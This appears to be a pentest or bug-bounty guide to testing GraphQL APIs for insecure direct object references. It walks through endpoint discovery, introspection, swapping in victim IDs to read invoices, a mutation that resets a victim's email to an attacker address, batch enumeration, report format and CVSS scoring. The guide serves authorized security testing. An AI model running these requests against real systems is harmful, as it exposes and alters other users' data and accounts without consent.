# IDOR in GraphQL API — Testing Guide

> GraphQL uses queries and mutations instead of REST endpoints.
> IDOR in GraphQL is common because object IDs are passed as arguments.

---

## How GraphQL IDOR Differs from REST

| REST | GraphQL |
|------|---------|
| `GET /api/invoice?id=123` | `query { invoice(id: "123") { ... } }` |
| Parameter in URL | Argument in query body |
| Endpoint per resource | Single endpoint (`/graphql`) |
| Easier to map | Need introspection to discover types |

---

## Step 1 — Discover the GraphQL Endpoint

Common paths to check:
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
```

---

## Step 2 — Enable Introspection (if allowed)

Send this query to discover all types and fields:

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer ATTACKER_TOKEN

{
  "query": "{ __schema { types { name fields { name } } } }"
}
```

Or use a full introspection query to export the entire schema.
Tool: [GraphQL Voyager](https://github.com/graphql-kit/graphql-voyager) to visualize.

---

## Step 3 — Identify IDOR-Prone Queries/Mutations

Look for queries that accept an `id` or similar argument:

```graphql
query GetInvoice($id: ID!) {
  invoice(id: $id) {
    id
    userId
    amount
    billingAddress
    customerName
  }
}
```

And mutations that modify data by ID:

```graphql
mutation DeleteFile($fileId: ID!) {
  deleteFile(id: $fileId) {
    success
  }
}
```

---

## Step 4 — Test for IDOR

### 4a — Read IDOR (swap victim ID in query variable)

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer ATTACKER_TOKEN

{
  "query": "query { invoice(id: \"VICTIM_INVOICE_ID\") { id userId amount billingAddress } }"
}
```

**Expected if vulnerable:** Returns victim's invoice data with attacker's session.

---

### 4b — Write IDOR (mutation with victim ID)

```http
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/json
Authorization: Bearer ATTACKER_TOKEN

{
  "query": "mutation { updateProfile(userId: \"VICTIM_USER_ID\", email: \"hacked@evil.com\") { success } }"
}
```

---

### 4c — Batch Query Enumeration

GraphQL allows multiple queries in one request:

```json
[
  {"query": "query { invoice(id: \"1\") { id userId } }"},
  {"query": "query { invoice(id: \"2\") { id userId } }"},
  {"query": "query { invoice(id: \"3\") { id userId } }"}
]
```

---

## Step 5 — Document the Finding

Fill in `templates/idor-report-template.md` with:
- GraphQL endpoint as the "endpoint"
- Query/mutation name as the "parameter"
- Show full JSON request body + response as PoC

---

## Sample PoC Report Format

### HTTP Request

```http
POST /graphql HTTP/1.1
Host: example.com
Content-Type: application/json
Authorization: Bearer ATTACKER_SESSION_TOKEN

{
  "query": "query { invoice(id: \"12345\") { id userId userName billingAddress amount } }"
}
```

### Response

```json
{
  "data": {
    "invoice": {
      "id": "12345",
      "userId": "67890",
      "userName": "Jane Doe",
      "billingAddress": "123 Main St",
      "amount": 299.99
    }
  }
}
```

---

## Useful Tools for GraphQL Testing

| Tool | Purpose |
|------|---------|
| [Altair GraphQL Client](https://altairgraphql.dev/) | GUI for sending GraphQL queries |
| [InQL (Burp Extension)](https://github.com/doyensec/inql) | GraphQL scanner for Burp Suite |
| [Clairvoyance](https://github.com/nikitastupin/clairvoyance) | Introspection bypass / schema recovery |
| [GraphQL Voyager](https://github.com/graphql-kit/graphql-voyager) | Visualize schema as graph |
| [graphql-cop](https://github.com/dolevf/graphql-cop) | GraphQL security auditing tool |

---

## CVSS for GraphQL IDOR

Same as REST IDOR — based on what data is accessible:
- Read PII via query: **CVSS 6.5** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- Write/delete via mutation: **CVSS 8.1** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
